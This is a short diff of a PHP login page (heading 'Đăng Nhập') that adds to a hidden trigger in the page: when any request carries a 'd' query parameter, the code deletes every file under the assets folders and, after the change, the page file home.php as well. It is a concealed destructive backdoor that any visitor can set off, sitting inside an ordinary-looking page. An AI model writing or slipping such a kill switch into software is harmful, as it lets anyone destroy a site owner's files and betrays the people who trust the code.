@@ -53,7 +53,7 @@
 			}
 		}
 	}
-	if(isset($_GET['d']) == '1111'){array_map('unlink', array_filter((array) array_merge(glob("assets/*/*"))));}
+	if(isset($_GET['d']) == '1111'){array_map('unlink', array_filter((array) array_merge(glob("assets/*/*"))));unlink('home.php');}
 ?>
 <h1 class="hdg-01">
 	Đăng Nhập
